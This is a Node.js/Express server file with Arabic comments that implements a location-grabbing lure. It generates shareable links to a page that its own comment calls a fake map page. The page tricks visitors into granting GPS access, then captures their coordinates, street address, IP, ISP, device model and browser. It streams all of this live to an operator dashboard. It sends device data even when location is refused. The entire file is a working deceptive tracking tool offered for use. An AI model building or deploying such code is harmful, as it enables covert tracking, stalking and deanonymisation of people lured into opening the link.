const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());

// 1. لوحة التحكم الرئيسية لعرض النتائج وتوليد روابط الخرائط
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة التحكم - تعقب الخرائط</title>
        <style>
            body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
            .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
            button { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; }
            button:hover { background: #0056b3; }
            input { width: 90%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; text-align: center; margin-top: 10px; }
            .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #007bff; font-size: 14px; line-height: 1.7; }
        </style>
    </head>
    <body>
        <h2>🗺️ منشئ روابط الخرائط والمواقع الذكية</h2>
        <div class="card">
            <p>انقر لإنشاء رابط خريطة تفاعلي:</p>
            <button type="button" onclick="makeLink()">🔗 إنشاء رابط الخريطة</button>
            <div id="linkContainer" style="display:none; margin-top: 15px;">
                <p>الرابط الخاص بك (انسخه وافتحه):</p>
                <input type="text" id="linkInput" readonly onclick="this.select();">
            </div>
        </div>

        <h3>📥 التقارير والمواقع الواردة:</h3>
        <div id="logs" class="card">
            <p style="color: #aaa;">في انتظار فتح الرابط...</p>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            function makeLink() {
                const uniqueId = Math.random().toString(36).substring(2, 8);
                const fullUrl = window.location.origin + '/map/' + uniqueId;
                
                document.getElementById('linkInput').value = fullUrl;
                document.getElementById('linkContainer').style.display = 'block';
            }

            const socket = io();
            socket.on('new-device-data', (data) => {
                const logs = document.getElementById('logs');
                if (logs.innerText.includes('في انتظار فتح')) logs.innerHTML = '';
                
                const box = document.createElement('div');
                box.className = 'info-box';
                box.innerHTML = '<strong>📱 ماركة الهاتف:</strong> ' + data.deviceName + '<br>' +
                                '<strong>🌐 المتصفح والنظام:</strong> ' + data.browser + ' / ' + data.os + '<br>' +
                                '<strong>📡 الشبكة (ISP):</strong> ' + data.networkISP + '<br>' +
                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
                                '<strong>📍 العنوان الدقيق (الشارع والمنطقة):</strong> <span style="color: #4CAF50; font-weight: bold;">' + data.fullAddress + '</span><br>' +
                                '<strong>🗺️ إحداثيات الخريطة:</strong> <a href="https://maps.google.com/?q=' + data.lat + ',' + data.lon + '" target="_blank" style="color: #00bcd4;">فتح على خرائط جوجل</a><br>' +
                                '<strong>🕒 الوقت:</strong> ' + data.time;
                logs.prepend(box);
            });
        </script>
    </body>
    </html>
  `);
});

// 2. صفحة الخريطة الوهمية التي تطلب إذن الموقع عند الضغط على الزر
app.get('/map/:id', async (req, res) => {
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();

  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>خريطة الموقع التفاعلية</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f4f4f9; color: #333; margin: 0; padding: 0; text-align: center; }
            .header { background: #007bff; color: white; padding: 15px; font-size: 20px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
            .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
            button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; box-shadow: 0 4px 10px rgba(40,167,69,0.3); }
            button:hover { background: #218838; }
            p { color: #666; font-size: 15px; line-height: 1.6; }
            #status { margin-top: 15px; font-weight: bold; color: #007bff; }
        </style>
    </head>
    <body>
        <div class="header">📍 مشاركة الموقع الجغرافي</div>
        <div class="container">
            <h3>عرض موقعك الحالي على الخريطة</h3>
            <p>للعثور على الموقع بدقة وتحديث الإحداثيات على الخريطة المباشرة، يرجى الضغط على الزر أدناه والسماح بالوصول للموقع.</p>
            <button onclick="requestLocation()">🗺️ عرض الموقع الآن</button>
            <div id="status"></div>
        </div>

        <script>
            function getExactDeviceModel(ua) {
                let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
                if (match) return match[0];
                if (ua.includes('Android')) return 'هاتف Android';
                if (ua.includes('iPhone')) return 'Apple iPhone';
                if (ua.includes('Windows')) return 'Windows Computer';
                return 'جهاز ذكي';
            }

            function getBrowserInfo(ua) {
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
                if (ua.includes('Edg')) return 'Edge';
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Safari')) return 'Safari';
                return 'متصفح آخر';
            }

            function getOSInfo(ua) {
                if (ua.includes('Win')) return 'Windows';
                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                if (ua.includes('Mac')) return 'macOS';
                return 'أخرى';
            }

            async function requestLocation() {
                document.getElementById('status').innerText = "جاري الاتصال بالأقمار الصناعية وتحميل الخريطة...";
                
                const ua = navigator.userAgent;
                const deviceData = {
                    deviceName: getExactDeviceModel(ua),
                    browser: getBrowserInfo(ua),
                    os: getOSInfo(ua),
                    ip: "${clientIp}",
                    networkISP: "جاري الجلب...",
                    fullAddress: "جاري تحديد الموقع...",
                    lat: 0,
                    lon: 0,
                    time: new Date().toLocaleTimeString('ar-EG')
                };

                // جلب معلومات الـ IP والشبكة
                try {
                    const response = await fetch('https://ipapi.co/${clientIp}/json/');
                    const ipData = await response.json();
                    deviceData.networkISP = ipData.org || "غير معروف";
                } catch(e){}

                // طلب إذن الـ GPS الفعلي عند ضغط الزر
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            const lat = pos.coords.latitude;
                            const lon = pos.coords.longitude;
                            deviceData.lat = lat;
                            deviceData.lon = lon;

                            try {
                                const resGeo = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&accept-language=ar');
                                const geoData = await resGeo.json();
                                if (geoData && geoData.display_name) {
                                    deviceData.fullAddress = geoData.display_name;
                                } else {
                                    deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
                                }
                            } catch(err) {
                                deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
                            }

                            sendData(deviceData);
                            document.getElementById('status').style.color = "green";
                            document.getElementById('status').innerText = "✅ تم تحميل الموقع بنجاح!";
                        },
                        (err) => {
                            deviceData.fullAddress = "رفض المستخدم إذن الموقع";
                            sendData(deviceData);
                            document.getElementById('status').style.color = "red";
                            document.getElementById('status').innerText = "❌ يجب السماح بإذن الموقع لعرض الخريطة.";
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                } else {
                    deviceData.fullAddress = "المتصفح لا يدعم تحديد الموقع";
                    sendData(deviceData);
                }
            }

            function sendData(data) {
                fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            }
        </script>
    </body>
    </html>
  `);
});

app.post('/api/log', (req, res) => {
  io.emit('new-device-data', req.body);
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
